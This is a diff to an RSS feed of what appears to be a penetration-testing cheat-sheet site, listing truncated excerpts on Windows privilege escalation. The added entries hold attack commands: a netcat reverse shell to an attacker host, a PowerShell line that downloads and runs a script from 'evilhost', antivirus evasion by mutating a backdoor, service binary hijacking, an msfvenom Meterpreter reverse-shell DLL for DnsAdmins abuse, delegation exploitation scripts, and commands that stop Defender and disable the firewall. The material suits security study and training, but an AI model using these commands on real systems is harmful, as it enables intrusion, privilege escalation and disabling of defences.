@@ -11,13 +11,13 @@
     
     
     <item>
-      <title>Admin and Processes</title>
-      <link>/windows-systems/privilege-escalation/admin_processes/</link>
+      <title>Automated Recon</title>
+      <link>/windows-systems/privilege-escalation/automated_recon/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
-      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
-Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+      <guid>/windows-systems/privilege-escalation/automated_recon/</guid>
+      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe 
+Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
     </item>
     
     <item>
@@ -26,7 +26,16 @@ Sessions # Query DC to check about domain active sessions: net group “Domain C
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://evilhost/Malicious.ps1&amp;#39;)&amp;#34; # Payload as a trusted binary # Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\ # Then %userprofile%\AppData\Local\Microsoft\Teams\Update.</description>
+    </item>
+    
+    <item>
+      <title>Services &amp; Scheduled Tasks</title>
+      <link>/windows-systems/privilege-escalation/services_scheduled_tasks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/services_scheduled_tasks/</guid>
+      <description>Services # Query one service sc qc Spooler # Check permissions accesschk.exe -ucqv Spooler C:\&amp;gt; accesschk.exe -uwcqv &amp;#34;Authenticated Users&amp;#34; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS accesschk.exe -ucqv SSDPSRV accesschk.exe -ucqv upnphost # Search for specific service (looking for write permissions) sc qc upnphost # Following rights can give a SYSTEM shell SERVICE_CHANGE_CONFIG (Can reconfigure the service binary) WRITE_DAC (Can reconfigure permissions, leading to 1) WRITE_OWNER (Can become owner and reconfigure permissions) GENERIC_WRITE (Inherits SERVICE_CHANGE_CONFIG) GENERIC_ALL (Inherits SERVICE_CHANGE_CONFIG) # Exploit a vulnerable service (or adding new user) sc config upnphost binpath= &amp;#34;C:\nc.</description>
     </item>
     
     <item>
@@ -40,12 +49,31 @@ Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz #
     </item>
     
     <item>
-      <title>Windows Defender</title>
-      <link>/windows-systems/privilege-escalation/windows_defender/</link>
+      <title>Admin and Processes</title>
+      <link>/windows-systems/privilege-escalation/admin_processes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
-      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
+      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
+Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
+    </item>
+    
+    <item>
+      <title>DNSadmins group</title>
+      <link>/windows-systems/privilege-escalation/dnsadmins_group/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
+      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
+    </item>
+    
+    <item>
+      <title>Active Directory Delegations</title>
+      <link>/windows-systems/privilege-escalation/delegations/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/delegations/</guid>
+      <description>RBCD Exploitation https://github.com/aas-n/leHACK19 # Importing Powerview and Powermad Import-Module .\Powerview.ps1 Import-Module .\Powermad.ps1 # Authentication $TargetComputer = &amp;#34;DC01.domain.lan&amp;#34; $SecPassword = ConvertTo-SecureString &amp;#39;passw0rd&amp;#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&amp;#39;DOMAIN\ControlledAccount&amp;#39;, $SecPassword) # Get our user&amp;#39;s SID $AttackerSID = Get-DomainUser ControlledUser -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL $TargetComputer -Credential $Cred -Server 10.10.10.10 | ?{$_.SecurityIdentifier -match $AttackerSID} # Adding a machine and getting SID New-MachineAccount -Credential $Cred -Domain domain.</description>
     </item>
     
     <item>
@@ -59,12 +87,12 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
     </item>
     
     <item>
-      <title>DNSadmins group</title>
-      <link>/windows-systems/privilege-escalation/dnsadmins_group/</link>
+      <title>Windows Defender</title>
+      <link>/windows-systems/privilege-escalation/windows_defender/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/dnsadmins_group/</guid>
-      <description># If you control any account member of the &amp;#34;DnsAdmin&amp;#34; group # You can use it to privesc on the machine # It works by adding a malicious DLL loaded by the DNS service. # You have to restart the service and the DLL will be loaded as SYSTEM# Generating the DLL $ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &amp;gt; privesc.dll # Host the DLL on a SMD server or upload it on the target machine $ sudo smbserver.</description>
+      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
+      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
     </item>
     
   </channel>
